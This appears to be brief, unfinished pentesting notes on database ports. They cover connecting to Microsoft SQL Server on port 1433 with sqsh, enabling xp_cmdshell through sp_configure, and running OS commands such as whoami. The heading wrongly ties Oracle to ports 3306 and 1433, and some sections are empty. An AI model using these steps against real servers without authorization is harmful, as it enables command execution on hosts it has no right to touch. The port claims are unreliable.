
# Oracle DB 
- **can run on a variety or ports including: 3306, 1433**

## What is it?
- a port used to connect to a target's database
- authenticated users (and maybe unauthenticated users) could, for example, run queries

## Enumeration
- use odat
  - setup is terrible but directions will be included inside here
  - 


## Port 1433 SQL
- gaining a connection
  - unless you brute force, you'll probably need to enumorate a username and password
  - sqsh -S [ip] -U [username] 
    - will prompt you for password after this

    
  ### sqsh Shell commands
    - xp_cmdshell 'whoami';
    - go
    - might have to enable xp_cmdshell
      - EXEC sp_configure 'show advanced options', 1;
      - RECONFIGURE
      - EXEC sp_configure 'xp_cmdshell', 1;
      - RECONFIGURE
    - 
  


